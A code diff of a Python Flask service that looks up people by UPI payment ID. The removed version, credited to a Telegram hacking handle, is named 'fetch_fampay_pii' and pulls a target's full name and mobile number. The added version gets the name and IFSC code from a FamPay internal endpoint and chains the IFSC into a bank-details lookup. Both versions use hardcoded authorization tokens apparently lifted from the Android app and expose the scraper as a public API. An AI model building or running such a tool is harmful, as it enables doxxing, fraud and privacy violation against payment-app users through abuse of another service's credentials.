@@ -1,101 +1,72 @@
-from flask import Flask, jsonify, request
+from flask import Flask, request, jsonify
 import requests
 import json
-import sys
+
+# --- Configuration ---
+HALFBLOOD_URL = "https://halfblood.famapp.in/vpa/verifyExt"
+RAZORPAY_IFSC_URL = "https://ifsc.razorpay.com/"
+HEADERS = {
+    'User-Agent': "A015 | Android 15 | Dalvik/2.1.0 | Tetris | 318D0D6589676E17F88CCE03A86C2591C8EBAFBA |  (Build -1) | 3DB5HIEMMG",
+    'Accept': "application/json",
+    'Content-Type': "application/json",
+    'authorization': "Token eyJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwiZXBrIjp7Imt0eSI6Ik9LUCIsImNydiI6Ilg0NDgiLCJ4IjoidHlSR1NIak1heW5SRFBGbGxLVDFIY3owWTZSRVFUUkM3WW1ueURpUGJFZzBlenIyeGRMTi03QmZ3MGExZDZabWVmT2NSMU5UVnUwIn0sImFsZyI6IkVDREgtRVMifQ..RCO9yZSnrEvVHywcR4Drww.p8zp6Vd-YkuDVH2MBwyBMJedMfrfwpWCN2yDc9K1JnNZ1Mkj6Wqy5ZMqdiEZW72Db_DoebWD-68B7wIFKySQAKI0wiHxBNfio3UtFAcUFG-R90P3r-YkTVBxdIO9LrqDaUHkes_Rdce5suLt8E51pW4kOPttBqPQEl0vaqSn2WTDyApu45wy6RZinOi7osFcLUX5fGKOIWnFR8lpEBN5l59vmaw6E3b_SZPbeyRZK0OMeGUZBQZIHxfM7C7z7I7qNd_XWkVvGxIPa7seF2qFqQ.iXJ-yqepcGrXu8R_7--IepHJlNyCcFjDqZXdA-Ts7ww"
+}
 
 app = Flask(__name__)
 
-# Credits
-# @never_delete | telegram cutehack
-
-WESTEROS_URL = "https://westeros.famapp.in/txn/create/payout/add/"
-
-# IMPORTANT: The 'authorization' token provided in the original script
-# might be time-sensitive or user-specific. If the API stops working,
-# this token is likely the first thing to check and update.
-HEADERS = {
-  'User-Agent': "A015 | Android 15 | Dalvik/2.1.0 | Tetris | 318D0D6589676E17F88CCE03A86C2591C8EBAFBA |  (Build -1) | 3DB5HIEMMG",
-  'Accept': "application/json",
-  'Content-Type': "application/json",
-  'authorization': "Token eyJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwiZXBrIjp7Imt0eSI6Ik9LUCIsImNydiI6Ilg0NDgiLCJ4IjoicGEwWmVNd255eFBKYXB5ZU9udXlkV1J1OEJWbFlMY1l2YkliUC1FOXhkdUo2dzNGbmNOTDFHMlZqVm9ZZWktOGEzRlRaX29tdGFRIn0sImFsZyI6IkVDREgtRVMifQ.._Fz2hxuGqpjf7V1pCeznsA.g4R7FbdRU3R7m1j3bkSyEljVTsqv8lLCEDy4Vsh2-06j1w1lw4f7ME6j6HB_B_8GMV6H63BR2mU-ogNBW1uKIDDiJQFKn4KkmOdbZX_Gr7y6BIty5FwqV6Tx4pk2NVMdl07eNPyLZZExpp9whLOOxrB02fSxMTptvHMYsSAkQaEt1eHaLkERPSj84loywzsFjWSmgYlr9Tt0MaFoB4Va348_ZFs1JI1sDpq9ZEicW2RBnz2vka2tz_zki-5rj7Enhi9HP5xMoo9XOwvmnvZAAQ.tWG08-yG0nr1vF7VKDUUC4zLHbkB3rYegjW47kP5Vk8"
-}
-
-def fetch_fampay_pii(upi_id):
-    """
-    Fetches PII for a FamPay UPI ID.
-    Returns a dictionary with user info or an error message.
-    """
-    
-    payload = {
-        "upi_string": f"upi://pay?pa={upi_id}",
-        "init_mode": "00",
-        "is_uploaded_from_gallery": False
-    }
+def fetch_and_chain(upi_id):
+    # --- Step 1: Fetch data from FamPay API ---
+    vpa_payload = {"upi_string": f"upi://pay?pa={upi_id}"}
+    vpa_details = None
+    ifsc_code = None
     
     try:
-        response = requests.post(WESTEROS_URL, data=json.dumps(payload), headers=HEADERS, timeout=10)
-        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
-        data = response.json()
+        response_vpa = requests.post(HALFBLOOD_URL, data=json.dumps(vpa_payload), headers=HEADERS, timeout=10)
+        response_vpa.raise_for_status()
+        vpa_info = response_vpa.json().get("data", {}).get("verify_vpa_resp", {})
         
-        user_info = data.get("user", {})
-        if not user_info:
-            return {"error": f"'user' object not found in the response for {upi_id}.", "status_code": 404}
+        if not vpa_info:
+            return {"error": "'verify_vpa_resp' object not found in FamPay response."}, 400
 
-        first_name = user_info.get("first_name", "")
-        last_name = user_info.get("last_name", "")
-        full_name = f"{first_name} {last_name}".strip()
-        
-        phone_number = user_info.get("contact", {}).get("phone_number")
-
-        final_output = {
-            "name": full_name,
-            "upi_id": upi_id,
-            "mobile_number": phone_number,
-            "credits": "@never_delete | telegram cutehack"
+        vpa_details = {
+            "name": vpa_info.get("name"),
+            "vpa": vpa_info.get("vpa"),
+            "ifsc": vpa_info.get("ifsc")
         }
-        
-        return final_output
-
-    except requests.exceptions.HTTPError as e:
-        return {"error": f"API Request Error: HTTP {e.response.status_code} - {e.response.text}", "status_code": e.response.status_code}
-    except requests.exceptions.ConnectionError as e:
-        return {"error": f"API Connection Error: {e}", "status_code": 503}
-    except requests.exceptions.Timeout:
-        return {"error": "API Request timed out.", "status_code": 408}
+        ifsc_code = vpa_details.get("ifsc")
+    
     except requests.exceptions.RequestException as e:
-        return {"error": f"An unexpected API request error occurred: {e}", "status_code": 500}
-    except json.JSONDecodeError:
-        return {"error": "Failed to decode JSON response from the FamPay API.", "status_code": 500}
-    except Exception as e:
-        return {"error": f"An internal server error occurred: {e}", "status_code": 500}
+        return {"error": f"FamPay API call failed: {str(e)}"}, 500
 
-@app.route('/fampay_pii', methods=['GET'])
-def get_fampay_pii():
-    """
-    Flask API endpoint to fetch FamPay PII using a UPI ID.
-    Usage: GET /fampay_pii?upi_id=<target_upi_id>
-    """
-    upi_id = request.args.get('upi_id')
+    # --- Step 2: Fetch raw bank details from Razorpay API ---
+    final_output = {
+        "vpa_details": vpa_details,
+        "bank_details_raw": None
+    }
 
+    if ifsc_code:
+        try:
+            response_ifsc = requests.get(f"{RAZORPAY_IFSC_URL}{ifsc_code}", timeout=10)
+            if response_ifsc.status_code == 200:
+                final_output["bank_details_raw"] = response_ifsc.json()
+            else:
+                final_output["bank_details_raw"] = {"warning": f"Razorpay returned status {response_ifsc.status_code}"}
+        
+        except requests.exceptions.RequestException as e:
+            final_output["bank_details_raw"] = {"warning": f"Error during Razorpay API call: {str(e)}"}
+
+    return final_output, 200
+
+
+@app.route("/api/upi", methods=["GET"])
+def api_upi_lookup():
+    upi_id = request.args.get("upi_id")
     if not upi_id:
-        return jsonify({"error": "Missing 'upi_id' query parameter. Usage: /fampay_pii?upi_id=someuser@fam", "credits": "@never_delete | telegram cutehack"}), 400
+        return jsonify({"error": "Missing required parameter: upi_id"}), 400
 
-    if "@fam" not in upi_id.lower():
-        # You can choose to still process or warn. Here we will warn and proceed.
-        print(f"[!] Warning: This script is optimized for '@fam' UPIs. You may get limited or no data for {upi_id}.", file=sys.stderr)
+    result, status = fetch_and_chain(upi_id)
+    return jsonify(result), status
 
-    result = fetch_fampay_pii(upi_id)
 
-    if "error" in result:
-        status_code = result.get("status_code", 500)
-        result["credits"] = "@never_delete | telegram cutehack" # Add credits to error responses too
-        return jsonify(result), status_code
-    else:
-        return jsonify(result), 200
-
-if __name__ == '__main__':
-    # To run this Flask app:
-    # 1. Save it as a .py file (e.g., app.py)
-    # 2. Run from your terminal: python app.py
-    # 3. Access in your browser or with cURL: http://127.0.0.1:5000/fampay_pii?upi_id=targetname@fam
-    app.run(debug=True, host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
